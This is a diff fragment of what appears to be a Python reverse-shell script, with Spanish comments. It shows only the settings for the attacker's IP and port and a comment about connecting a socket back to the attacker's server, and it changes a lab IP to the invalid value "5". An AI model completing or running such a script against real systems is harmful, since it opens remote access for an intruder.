@@ -4,7 +4,7 @@ import subprocess
 import os
 
 # Configura tu IP y puerto aquí
-IP = "192.168.56.102"  # Cambia a tu IP atacante
+IP = "5"  # Cambia a tu IP atacante
 PORT = 8080  # Cambia al puerto que deseas usar
 
 # Crea un socket y se conecta al servidor atacante
